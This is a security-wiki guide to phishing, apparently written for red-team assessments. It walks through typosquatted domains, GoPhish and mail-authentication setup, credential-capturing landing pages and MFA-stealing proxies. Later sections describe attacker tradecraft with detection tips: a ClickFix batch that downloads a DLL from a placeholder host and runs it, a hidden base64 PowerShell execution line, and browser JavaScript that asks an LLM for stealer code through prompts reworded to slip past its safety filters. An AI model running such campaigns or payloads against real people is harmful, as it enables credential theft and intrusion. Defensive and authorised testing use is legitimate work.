_body: "# Phishing Methodology\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Methodology\n\n1. Recon the victim\n\
  \   1. Select the **victim domain**.\n   2. Perform some basic web enumeration **searching for login portals** used by the\
  \ victim and **decide** which one you will **impersonate**.\n   3. Use some **OSINT** to **find emails**.\n2. Prepare the\
  \ environment\n   1. **Buy the domain** you are going to use for the phishing assessment\n   2. **Configure the email service**\
  \ related records (SPF, DMARC, DKIM, rDNS)\n   3. Configure the VPS with **gophish**\n3. Prepare the campaign\n   1. Prepare\
  \ the **email template**\n   2. Prepare the **web page** to steal the credentials\n4. Launch the campaign!\n\n## Generate\
  \ similar domain names or buy a trusted domain\n\n### Domain Name Variation Techniques\n\n- **Keyword**: The domain name\
  \ **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).\n- **hypened subdomain**:\
  \ Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).\n- **New TLD**: Same domain using a **new TLD**\
  \ (e.g., zelster.org)\n- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g.,\
  \ zelfser.com).\n\n\n{{#ref}}\nhomograph-attacks.md\n{{#endref}}\n- **Transposition:** It **swaps two letters** within the\
  \ domain name (e.g., zelsetr.com).\n- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name\
  \ (e.g., zeltsers.com).\n- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).\n- **Repetition:**\
  \ It **repeats one** of the letters in the domain name (e.g., zeltsser.com).\n- **Replacement**: Like homoglyph but less\
  \ stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter\
  \ on the keyboard (e.g, zektser.com).\n- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).\n\
  - **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).\n- **Missing dot**: Append the TLD to\
  \ the domain name. (e.g., zelstercom.com)\n\n**Automatic Tools**\n\n- [**dnstwist**](https://github.com/elceef/dnstwist)\n\

  \n### Bitflipping\n\nThere is a **possibility that one of some bits stored or in communication might get automatically flipped**\
  \ due to various factors like solar flares, cosmic rays, or hardware errors.\n\nWhen this concept is **applied to DNS requests**,\
  \ it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.\n\nFor\
  \ example, a single bit modification in the domain \"windows.com\" can change it to \"windnws.com.\"\n\nAttackers may **take\
  \ advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention\
  \ is to redirect legitimate users to their own infrastructure.\n\nFor more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)\n\
  \n### Buy a trusted domain\n\nYou can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a\
  \ expired domain that you could use.\\\nIn order to make sure that the expired domain that you are going to buy **has already\
  \ a good SEO** you could search how is it categorized in:\n\n- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)\n\
  - [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)\n\n## Discovering\
  \ Emails\n\n- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)\n- [https://phonebook.cz/](https://phonebook.cz)\
  \ (100% free)\n- [https://maildb.io/](https://maildb.io)\n- [https://hunter.io/](https://hunter.io)\n- [https://anymailfinder.com/](https://anymailfinder.com)\n\
  \nIn order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if\
  \ you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\\\
  \nMoreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable\
  \ to **username brute force**, and exploit the vulnerability if possible.\n\n## Configuring GoPhish\n\n### Installation\n\
  \nYou can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)\n\
  \nDownload and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\\\nYou will be given a password for\
  \ the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password.\
  \ You may need to tunnel that port to local:\n\n```bash\nssh -L 3333:127.0.0.1:3333 <user>@<ip>\n```\n\n### Configuration\n\
  \n**TLS certificate configuration**\n\nBefore this step you should have **already bought the domain** you are going to use\
  \ and it must be **pointing** to the **IP of the VPS** where you are configuring **gophish**.\n\n```bash\nDOMAIN=\"<domain>\"\
  \nwget https://dl.eff.org/certbot-auto\nchmod +x certbot-auto\nsudo apt install snapd\nsudo snap install core\nsudo snap\
  \ refresh core\nsudo apt-get remove certbot\nsudo snap install --classic certbot\nsudo ln -s /snap/bin/certbot /usr/bin/certbot\n\
  certbot certonly --standalone -d \"$DOMAIN\"\nmkdir /opt/gophish/ssl_keys\ncp \"/etc/letsencrypt/live/$DOMAIN/privkey.pem\"\
  \ /opt/gophish/ssl_keys/key.pem\ncp \"/etc/letsencrypt/live/$DOMAIN/fullchain.pem\" /opt/gophish/ssl_keys/key.crt​\n```\n\
  \n**Mail configuration**\n\nStart installing: `apt-get install postfix`\n\nThen add the domain to the following files:\n\
  \n- **/etc/postfix/virtual_domains**\n- **/etc/postfix/transport**\n- **/etc/postfix/virtual_regexp**\n\n**Change also the\
  \ values of the following variables inside /etc/postfix/main.cf**\n\n`myhostname = <domain>`\\\n`mydestination = $myhostname,\
  \ <domain>, localhost.com, localhost`\n\nFinally modify the files **`/etc/hostname`** and **`/etc/mailname`** to your domain\
  \ name and **restart your VPS.**\n\nNow, create a **DNS A record** of `mail.<domain>` pointing to the **ip address** of\
  \ the VPS and a **DNS MX** record pointing to `mail.<domain>`\n\nNow lets test to send an email:\n\n```bash\napt install\
  \ mailutils\necho \"This is the body of the email\" | mail -s \"This is the subject line\" test@email.com\n```\n\n**Gophish\
  \ configuration**\n\nStop the execution of gophish and lets configure it.\\\nModify `/opt/gophish/config.json` to the following\
  \ (note the use of https):\n\n```bash\n{\n        \"admin_server\": {\n                \"listen_url\": \"127.0.0.1:3333\"\
  ,\n                \"use_tls\": true,\n                \"cert_path\": \"gophish_admin.crt\",\n                \"key_path\"\
  : \"gophish_admin.key\"\n        },\n        \"phish_server\": {\n                \"listen_url\": \"0.0.0.0:443\",\n   \
  \             \"use_tls\": true,\n                \"cert_path\": \"/opt/gophish/ssl_keys/key.crt\",\n                \"\
  key_path\": \"/opt/gophish/ssl_keys/key.pem\"\n        },\n        \"db_name\": \"sqlite3\",\n        \"db_path\": \"gophish.db\"\
  ,\n        \"migrations_prefix\": \"db/db_\",\n        \"contact_address\": \"\",\n        \"logging\": {\n            \
  \    \"filename\": \"\",\n                \"level\": \"\"\n        }\n}\n```\n\n**Configure gophish service**\n\nIn order\
  \ to create the gophish service so it can be started automatically and managed a service you can create the file `/etc/init.d/gophish`\
  \ with the following content:\n\n```bash\n#!/bin/bash\n# /etc/init.d/gophish\n# initialization file for stop/start of gophish\
  \ application server\n#\n# chkconfig: - 64 36\n# description: stops/starts gophish application server\n# processname:gophish\n\
  # config:/opt/gophish/config.json\n# From https://github.com/gophish/gophish/issues/586\n\n# define script variables\n\n\
  processName=Gophish\nprocess=gophish\nappDirectory=/opt/gophish\nlogfile=/var/log/gophish/gophish.log\nerrfile=/var/log/gophish/gophish.error\n\
  \nstart() {\n    echo 'Starting '${processName}'...'\n    cd ${appDirectory}\n    nohup ./$process >>$logfile 2>>$errfile\
  \ &\n    sleep 1\n}\n\nstop() {\n    echo 'Stopping '${processName}'...'\n    pid=$(/bin/pidof ${process})\n    kill ${pid}\n\
  \    sleep 1\n}\n\nstatus() {\n    pid=$(/bin/pidof ${process})\n    if [[\"$pid\" != \"\"| \"$pid\" != \"\" ]]; then\n\
  \        echo ${processName}' is running...'\n    else\n        echo ${processName}' is not running...'\n    fi\n}\n\ncase\
  \ $1 in\n    start|stop|status) \"$1\" ;;\nesac\n```\n\nFinish configuring the service and checking it doing:\n\n```bash\n\
  mkdir /var/log/gophish\nchmod +x /etc/init.d/gophish\nupdate-rc.d gophish defaults\n#Check the service\nservice gophish\
  \ start\nservice gophish status\nss -l | grep \"3333\\|443\"\nservice gophish stop\n```\n\n## Configuring mail server and\
  \ domain\n\n### Wait & be legit\n\nThe older a domain is the less probable it's going to be caught as spam. Then you should\
  \ wait as much time as possible (at least 1week) before the phishing assessment. moreover, if you put a page about a reputational\
  \ sector the reputation obtained will be better.\n\nNote that even if you have to wait a week you can finish configuring\
  \ everything now.\n\n### Configure Reverse DNS (rDNS) record\n\nSet a rDNS (PTR) record that resolves the IP address of\
  \ the VPS to the domain name.\n\n### Sender Policy Framework (SPF) Record\n\nYou must **configure a SPF record for the new\
  \ domain**. If you don't know what is a SPF record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).\n\
  \nYou can use [https://www.spfwizard.net/](https://www.spfwizard.net) to generate your SPF policy (use the IP of the VPS\
  \ machine)\n\n![](<../../images/image (1037).png>)\n\nThis is the content that must be set inside a TXT record inside the\
  \ domain:\n\n```bash\nv=spf1 mx a ip4:ip.ip.ip.ip ?all\n```\n\n### Domain-based Message Authentication, Reporting & Conformance\
  \ (DMARC) Record\n\nYou must **configure a DMARC record for the new domain**. If you don't know what is a DMARC record [**read\
  \ this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).\n\nYou have to create a new DNS TXT\
  \ record pointing the hostname `_dmarc.<domain>` with the following content:\n\n```bash\nv=DMARC1; p=none\n```\n\n### DomainKeys\
  \ Identified Mail (DKIM)\n\nYou must **configure a DKIM for the new domain**. If you don't know what is a DMARC record [**read\
  \ this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).\n\nThis tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)\n\
  \n> [!TIP]\n> You need to concatenate both B64 values that the DKIM key generates:\n>\n> ```\n> v=DKIM1; h=sha256; k=rsa;\
  \ p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj\"\
  \ \"Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB\n\
  > ```\n\n### Test your email configuration score\n\nYou can do that using [https://www.mail-tester.com/](https://www.mail-tester.com)\\\
  \nJust access the page and send an email to the address they give you:\n\n```bash\necho \"This is the body of the email\"\
  \ | mail -s \"This is the subject line\" test-iimosa79z@srv1.mail-tester.com\n```\n\nYou can also **check your email configuration**\
  \ sending an email to `check-auth@verifier.port25.com` and **reading the response** (for this you will need to **open**\
  \ port **25** and see the response in the file _/var/mail/root_ if you send the email a as root).\\\nCheck that you pass\
  \ all the tests:\n\n```bash\n==========================================================\nSummary of Results\n==========================================================\n\
  SPF check:          pass\nDomainKeys check:   neutral\nDKIM check:         pass\nSender-ID check:    pass\nSpamAssassin\
  \ check: ham\n```\n\nYou could also send **message to a Gmail under your control**, and check the **email’s headers** in\
  \ your Gmail inbox, `dkim=pass` should be present in the `Authentication-Results` header field.\n\n```\nAuthentication-Results:\
  \ mx.google.com;\n       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;\n\
  \       dkim=pass header.i=@example.com;\n```\n\n### ​Removing from Spamhouse Blacklist\n\nThe page [www.mail-tester.com](https://www.mail-tester.com)\
  \ can indicate you if you your domain is being blocked by spamhouse. You can request your domain/IP to be removed at: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)\n\
  \n### Removing from Microsoft Blacklist\n\n​​You can request your domain/IP to be removed at [https://sender.office.com/](https://sender.office.com).\n\
  \n## Create & Launch GoPhish Campaign\n\n### Sending Profile\n\n- Set some **name to identify** the sender profile\n- Decide\
  \ from which account are you going to send the phishing emails. Suggestions: _noreply, support, servicedesk, salesforce..._\n\
  - You can leave blank the username and password, but make sure to check the Ignore Certificate Errors\n\n![](<../../images/image\
  \ (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1)\
  \ (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)\n\n> [!TIP]\n> It's recommended to\
  \ use the \"**Send Test Email**\" functionality to test that everything is working.\\\n> I would recommend to **send the\
  \ test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.\n\n### Email Template\n\n-\
  \ Set some **name to identify** the template\n- Then write a **subject** (nothing estrange, just something you could expect\
  \ to read in a regular email)\n- Make sure you have checked \"**Add Tracking Image**\"\n- Write the **email template** (you\
  \ can use variables like in the following example):\n\n```html\n<html>\n<head>\n    <title></title>\n</head>\n<body>\n<p\
  \ class=\"MsoNormal\"><span style=\"font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black\">Dear {{.FirstName}}\
  \ {{.LastName}},</span></p>\n<br />\nNote: We require all user to login an a very suspicios page before the end of the week,\
  \ thanks!<br />\n<br />\nRegards,</span></p>\n\nWRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY\n\n<p>{{.Tracker}}</p>\n\
  </body>\n</html>\n```\n\nNote that **in order to increase the credibility of the email**, it's recommended to use some signature\
  \ from an email from the client. Suggestions:\n\n- Send an email to a **non existent address** and check if the response\
  \ has any signature.\n- Search for **public emails** like info@ex.com or press@ex.com or public@ex.com and send them an\
  \ email and wait for the response.\n- Try to contact **some valid discovered** email and wait for the response\n\n![](<../../images/image\
  \ (80).png>)\n\n> [!TIP]\n> The Email Template also allows to **attach files to send**. If you would also like to steal\
  \ NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).\n\
  \n### Landing Page\n\n- Write a **name**\n- **Write the HTML code** of the web page. Note that you can **import** web pages.\n\
  - Mark **Capture Submitted Data** and **Capture Passwords**\n- Set a **redirection**\n\n![](<../../images/image (826).png>)\n\
  \n> [!TIP]\n> Usually you will need to modify the HTML code of the page and make some tests in local (maybe using some Apache\
  \ server) **until you like the results.** Then, write that HTML code in the box.\\\n> Note that if you need to **use some\
  \ static resources** for the HTML (maybe some CSS and JS pages) you can save them in _**/opt/gophish/static/endpoint**_\
  \ and then access them from _**/static/\\<filename>**_\n\n> [!TIP]\n> For the redirection you could **redirect the users\
  \ to the legit main web page** of the victim, or redirect them to _/static/migration.html_ for example, put some **spinning\
  \ wheel (**[**https://loading.io/**](https://loading.io)**) for 5 seconds and then indicate that the process was successful**.\n\
  \n### Users & Groups\n\n- Set a name\n- **Import the data** (note that in order to use the template for the example you\
  \ need the firstname, last name and email address of each user)\n\n![](<../../images/image (163).png>)\n\n### Campaign\n\
  \nFinally, create a campaign selecting a name, the email template, the landing page, the URL, the sending profile and the\
  \ group. Note that the URL will be the link sent to the victims\n\nNote that the **Sending Profile allow to send a test\
  \ email to see how will the final phishing email looks like**:\n\n![](<../../images/image (192).png>)\n\n> [!TIP]\n> I would\
  \ recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.\n\n\
  Once everything is ready, just launch the campaign!\n\n## Website Cloning\n\nIf for any reason you want to clone the website\
  \ check the following page:\n\n\n{{#ref}}\nclone-a-website.md\n{{#endref}}\n\n## Backdoored Documents & Files\n\nIn some\
  \ phishing assessments (mainly for Red Teams) you will want to also **send files containing some kind of backdoor** (maybe\
  \ a C2 or maybe just something that will trigger an authentication).\\\nCheck out the following page for some examples:\n\
  \n\n{{#ref}}\nphishing-documents.md\n{{#endref}}\n\n## Phishing MFA\n\n### Via Proxy MitM\n\nThe previous attack is pretty\
  \ clever as you are faking a real website and gathering the information set by the user. Unfortunately, if the user didn't\
  \ put the correct password or if the application you faked is configured with 2FA, **this information won't allow you to\
  \ impersonate the tricked user**.\n\nThis is where tools like [**evilginx2**](https://github.com/kgretzky/evilginx2)**,**\
  \ [**CredSniper**](https://github.com/ustayready/CredSniper) and [**muraena**](https://github.com/muraenateam/muraena) are\
  \ useful. This tool will allow you to generate a MitM like attack. Basically, the attacks works in the following way:\n\n\
  1. You **impersonate the login** form of the real webpage.\n2. The user **send** his **credentials** to your fake page and\
  \ the tool send those to the real webpage, **checking if the credentials work**.\n3. If the account is configured with **2FA**,\
  \ the MitM page will ask for it and once the **user introduces** it the tool will send it to the real web page.\n4. Once\
  \ the user is authenticated you (as attacker) will have **captured the credentials, the 2FA, the cookie and any information**\
  \ of every interaction your while the tool is performing a MitM.\n\n### Via VNC\n\nWhat if instead of **sending the victim\
  \ to a malicious page** with the same looks as the original one, you send him to a **VNC session with a browser connected\
  \ to the real web page**? You will be able to see what he does, steal the password, the MFA used, the cookies...\\\nYou\
  \ can do this with [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)\n\n## Detecting the detection\n\nObviously one\
  \ of the best ways to know if you have been busted is to **search your domain inside blacklists**. If it appears listed,\
  \ somehow your domain was detected as suspicions.\\\nOne easy way to check if you domain appears in any blacklist is to\
  \ use [https://malwareworld.com/](https://malwareworld.com)\n\nHowever, there are other ways to know if the victim is **actively\
  \ looking for suspicions phishing activity in the wild** as explained in:\n\n\n{{#ref}}\ndetecting-phising.md\n{{#endref}}\n\
  \nYou can **buy a domain with a very similar name** to the victims domain **and/or generate a certificate** for a **subdomain**\
  \ of a domain controlled by you **containing** the **keyword** of the victim's domain. If the **victim** perform any kind\
  \ of **DNS or HTTP interaction** with them, you will know that **he is actively looking** for suspicious domains and you\
  \ will need to be very stealth.\n\n### Evaluate the phishing\n\nUse [**Phishious** ](https://github.com/Rices/Phishious)to\
  \ evaluate if your email is going to end in the spam folder or if it's going to be blocked or successful.\n\n## High-Touch\
  \ Identity Compromise (Help-Desk MFA Reset)\n\nModern intrusion sets increasingly skip email lures entirely and **directly\
  \ target the service-desk / identity-recovery workflow** to defeat MFA.  The attack is fully \"living-off-the-land\": once\
  \ the operator owns valid credentials they pivot with built-in admin tooling – no malware is required.\n\n### Attack flow\n\
  1. Recon the victim \n   * Harvest personal & corporate details from LinkedIn, data breaches, public GitHub, etc.  \n  \
  \ * Identify high-value identities (executives, IT, finance) and enumerate the **exact help-desk process** for password\
  \ / MFA reset.\n2. Real-time social engineering  \n   * Phone, Teams or chat the help-desk while impersonating the target\
  \ (often with **spoofed caller-ID** or **cloned voice**).  \n   * Provide the previously-collected PII to pass knowledge-based\
  \ verification.  \n   * Convince the agent to **reset the MFA secret** or perform a **SIM-swap** on a registered mobile\
  \ number.\n3. Immediate post-access actions (≤60 min in real cases)  \n   * Establish a foothold through any web SSO portal.\
  \  \n   * Enumerate AD / AzureAD with built-ins (no binaries dropped):\n     ```powershell\n     # list directory groups\
  \ & privileged roles\n     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}\n\n     # AzureAD\
  \ / Graph – list directory roles\n     Get-MgDirectoryRole | ft DisplayName,Id\n\n     # Enumerate devices the account can\
  \ login to\n     Get-MgUserRegisteredDevice -UserId <user@corp.local>\n     ```\n   * Lateral movement with **WMI**, **PsExec**,\
  \ or legitimate **RMM** agents already whitelisted in the environment.\n\n### Detection & Mitigation\n* Treat help-desk\
  \ identity recovery as a **privileged operation** – require step-up auth & manager approval.\n* Deploy **Identity Threat\
  \ Detection & Response (ITDR)** / **UEBA** rules that alert on:  \n  * MFA method changed + authentication from new device\
  \ / geo.  \n  * Immediate elevation of the same principal (user-→-admin).  \n* Record help-desk calls and enforce a **call-back\
  \ to an already-registered number** before any reset.\n* Implement **Just-In-Time (JIT) / Privileged Access** so newly reset\
  \ accounts do **not** automatically inherit high-privilege tokens.\n\n---\n\n## At-Scale Deception – SEO Poisoning & “ClickFix”\
  \ Campaigns\nCommodity crews offset the cost of high-touch ops with mass attacks that turn **search engines & ad networks\
  \ into the delivery channel**.\n\n1. **SEO poisoning / malvertising** pushes a fake result such as `chromium-update[.]site`\
  \ to the top search ads.\n2. Victim downloads a small **first-stage loader** (often JS/HTA/ISO).  Examples seen by Unit\
  \ 42:\n   * `RedLine stealer`\n   * `Lumma stealer`\n   * `Lampion Trojan`\n3. Loader exfiltrates browser cookies + credential\
  \ DBs, then pulls a **silent loader** which decides – *in realtime* – whether to deploy:\n   * RAT (e.g. AsyncRAT, RustDesk)\n\
  \   * ransomware / wiper\n   * persistence component (registry Run key + scheduled task)\n\n### Hardening tips\n* Block\
  \ newly-registered domains & enforce **Advanced DNS / URL Filtering** on *search-ads* as well as e-mail.\n* Restrict software\
  \ installation to signed MSI / Store packages, deny `HTA`, `ISO`, `VBS` execution by policy.\n* Monitor for child processes\
  \ of browsers opening installers:\n  ```yaml\n  - parent_image: /Program Files/Google/Chrome/*\n    and child_image: *\\\
  \\*.exe\n  ```\n* Hunt for LOLBins frequently abused by first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).\n\n### ClickFix\
  \ DLL delivery tradecraft (fake CERT update)\n* Lure: cloned national CERT advisory with an **Update** button that displays\
  \ step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.\n\
  * Typical batch chain observed:\n  ```cmd\n  echo powershell -Command \"Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll'\
  \ -OutFile '%TEMP%\\notepad2.dll'\"\n  echo timeout /t 10\n  echo rundll32.exe \"%TEMP%\\notepad2.dll\",notepad\n  ```\n\
  \  * `Invoke-WebRequest` drops the payload to `%TEMP%`, a short sleep hides network jitter, then `rundll32` calls the exported\
  \ entrypoint (`notepad`).\n* The DLL beacons host identity and polls C2 every few minutes. Remote tasking arrives as **base64-encoded\
  \ PowerShell** executed hidden and with policy bypass:\n  ```powershell\n  powershell.exe -NoProfile -ExecutionPolicy Bypass\
  \ -WindowStyle Hidden -Command \"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression\"\
  \n  ```\n  * This preserves C2 flexibility (server can swap tasks without updating the DLL) and hides console windows. Hunt\
  \ for PowerShell children of `rundll32.exe` using `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` together.\n\
  * Defenders can look for HTTP(S) callbacks of the form `...page.php?tynor=<COMPUTER>sss<USER>` and 5-minute polling intervals\
  \ after DLL load.\n\n---\n\n## AI-Enhanced Phishing Operations\nAttackers now chain **LLM & voice-clone APIs** for fully\
  \ personalised lures and real-time interaction.\n\n| Layer | Example use by threat actor |\n|-------|-----------------------------|\n\
  |Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|\n|Generative AI|Produce *one-off*\
  \ emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|\n|Agentic AI|Autonomously\
  \ register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|\n\n\
  **Defence:**  \n• Add **dynamic banners** highlighting messages sent from untrusted automation (via ARC/DKIM anomalies).\
  \  \n• Deploy **voice-biometric challenge phrases** for high-risk phone requests.  \n• Continuously simulate AI-generated\
  \ lures in awareness programmes – static templates are obsolete.\n\nSee also – agentic browsing abuse for credential phishing:\n\

  \ tools and MCP (for secrets inventory and detection):\n\n{{#ref}}\nai-agent-abuse-local-ai-cli-tools-and-mcp.md\n{{#endref}}\n\
  \n## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)\n\nAttackers can ship benign-looking HTML\
  \ and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g.,\
  \ `eval` or dynamic `<script>`).\n\n1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate\
  \ wording to bypass safety filters and reduce hallucinations.\n2. **Client-side API call:** on load, JS calls a public LLM\
  \ (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.\n3. **Assemble & exec:** concatenate\
  \ the response and execute it (polymorphic per visit):\n\n```javascript\nfetch(\"https://llm.example/v1/chat\",{method:\"\
  POST\",body:JSON.stringify({messages:[{role:\"user\",content:promptText}]}),headers:{\"Content-Type\":\"application/json\"\
  ,Authorization:`Bearer ${apiKey}`}})\n  .then(r=>r.json())\n  .then(j=>{const payload=j.choices?.[0]?.message?.content;\
  \ eval(payload);});\n```\n\n4. **Phish/exfil:** generated code personalises the lure (e.g., LogoKit token parsing) and posts\
  \ creds to the prompt-hidden endpoint.\n\n**Evasion traits**\n- Traffic hits well-known LLM domains or reputable CDN proxies;\
  \ sometimes via WebSockets to a backend.\n- No static payload; malicious JS exists only after render.\n- Non-deterministic\
  \ generations produce **unique** stealers per session.\n\n**Detection ideas**\n- Run sandboxes with JS enabled; flag **runtime\
  \ `eval`/dynamic script creation sourced from LLM responses**.\n- Hunt for front-end POSTs to LLM APIs immediately followed\
  \ by `eval`/`Function` on returned text.\n- Alert on unsanctioned LLM domains in client traffic plus subsequent credential\
  \ POSTs.\n\n---\n\n## MFA Fatigue / Push Bombing Variant – Forced Reset\nBesides classic push-bombing, operators simply\
  \ **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login\
  \ prompt appears legitimate to the victim.\n\n```text\n[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can\
  \ you unenrol it so I can add a new authenticator?”\n[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration\
  \ e-mail\n[Attacker]  →  Completes new TOTP enrolment on their own device\n```\n\nMonitor for AzureAD/AWS/Okta events where\
  \ **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.\n\n\n\n## Clipboard Hijacking / Pastejacking\n\n\
  Attackers can silently copy malicious commands into the victim’s clipboard from a compromised or typosquatted web page and\
  \ then trick the user to paste them inside **Win + R**, **Win + X** or a terminal window, executing arbitrary code without\
  \ any download or attachment.\n\n\n{{#ref}}\nclipboard-hijacking.md\n{{#endref}}\n\n## Mobile Phishing & Malicious App Distribution\
  \ (Android & iOS)\n\n\n{{#ref}}\nmobile-phishing-malicious-apps.md\n{{#endref}}\n\n### Romance-gated APK + WhatsApp pivot\
  \ (dating-app lure)\n* The APK embeds static credentials and per-profile “unlock codes” (no server auth). Victims follow\
  \ a fake exclusivity flow (login → locked profiles → unlock) and, on correct codes, are redirected into WhatsApp chats with\
  \ attacker-controlled `+92` numbers while spyware runs silently.\n* Collection starts even before login: immediate exfil\
  \ of **device ID**, contacts (as `.txt` from cache), and documents (images/PDF/Office/OpenXML). A content observer auto-uploads\
  \ new photos; a scheduled job re-scans for new documents every **5 minutes**.\n* Persistence: registers for `BOOT_COMPLETED`\
  \ and keeps a **foreground service** alive to survive reboots and background evictions.\n\n### WhatsApp device-linking hijack\
  \ via QR social engineering\n* A lure page (e.g., fake ministry/CERT “channel”) displays a WhatsApp Web/Desktop QR and instructs\
  \ the victim to scan it, silently adding the attacker as a **linked device**.\n* Attacker immediately gains chat/contact\
  \ visibility until the session is removed. Victims may later see a “new device linked” notification; defenders can hunt\
  \ for unexpected device-link events shortly after visits to untrusted QR pages.\n\n### Mobile‑gated phishing to evade crawlers/sandboxes\n\
  Operators increasingly gate their phishing flows behind a simple device check so desktop crawlers never reach the final\
  \ pages. A common pattern is a small script that tests for a touch-capable DOM and posts the result to a server endpoint;\
  \ non‑mobile clients receive HTTP 500 (or a blank page), while mobile users are served the full flow.\n\nMinimal client\
  \ snippet (typical logic):\n\n```html\n<script src=\"/static/detect_device.js\"></script>\n```\n\n`detect_device.js` logic\
  \ (simplified):\n\n```javascript\nconst isMobile = ('ontouchstart' in document.documentElement);\nfetch('/detect', {method:'POST',\
  \ headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})\n  .then(()=>location.reload());\n\
  ```\n\nServer behaviour often observed:\n- Sets a session cookie during the first load.\n- Accepts `POST /detect {\"is_mobile\"\
  :true|false}`.\n- Returns 500 (or placeholder) to subsequent GETs when `is_mobile=false`; serves phishing only if `true`.\n\
  \nHunting and detection heuristics:\n- urlscan query: `filename:\"detect_device.js\" AND page.status:500`\n- Web telemetry:\
  \ sequence of `GET /static/detect_device.js` → `POST /detect` → HTTP 500 for non‑mobile; legitimate mobile victim paths\
  \ return 200 with follow‑on HTML/JS.\n- Block or scrutinize pages that condition content exclusively on `ontouchstart` or\
  \ similar device checks.\n\nDefence tips:\n- Execute crawlers with mobile‑like fingerprints and JS enabled to reveal gated\
  \ content.\n- Alert on suspicious 500 responses following `POST /detect` on newly registered domains.\n\n## References\n\
